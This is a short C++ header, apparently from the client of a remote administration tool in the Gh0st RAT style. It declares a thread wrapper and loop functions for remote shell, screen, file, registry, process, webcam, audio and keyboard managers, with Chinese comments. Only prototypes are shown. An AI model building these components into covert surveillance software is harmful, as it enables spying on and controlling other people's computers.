#pragma once

#include "IOCPClient.h"
#include "common/commands.h"

typedef struct _THREAD_ARG_LIST
{
	DWORD (WINAPI *StartAddress)(LPVOID lParameter);  
	LPVOID  lParam;
	bool	bInteractive; // 是否支持交互桌面  ??
	HANDLE	hEvent;
}THREAD_ARG_LIST, *LPTHREAD_ARG_LIST;

HANDLE _CreateThread (LPSECURITY_ATTRIBUTES  SecurityAttributes,   //安全属性
					  SIZE_T dwStackSize,                         //线程栈的大小  0                     
					  LPTHREAD_START_ROUTINE StartAddress,      //线程函数回调入口 MyMain
					  LPVOID lParam,                         //char* strHost  IP                 
					  DWORD  dwCreationFlags,                      //0  4
					  LPDWORD ThreadId, bool bInteractive=FALSE);  

DWORD WINAPI ThreadProc(LPVOID lParam);

DWORD WINAPI LoopShellManager(LPVOID lParam);
DWORD WINAPI LoopScreenManager(LPVOID lParam);
DWORD WINAPI LoopFileManager(LPVOID lParam);
DWORD WINAPI LoopTalkManager(LPVOID lParam);
DWORD WINAPI LoopProcessManager(LPVOID lParam);
DWORD WINAPI LoopWindowManager(LPVOID lParam);
DWORD WINAPI LoopVideoManager(LPVOID lParam);
DWORD WINAPI LoopAudioManager(LPVOID lParam);
DWORD WINAPI LoopRegisterManager(LPVOID lParam);
DWORD WINAPI LoopServicesManager(LPVOID lParam);
DWORD WINAPI LoopKeyboardManager(LPVOID lParam);
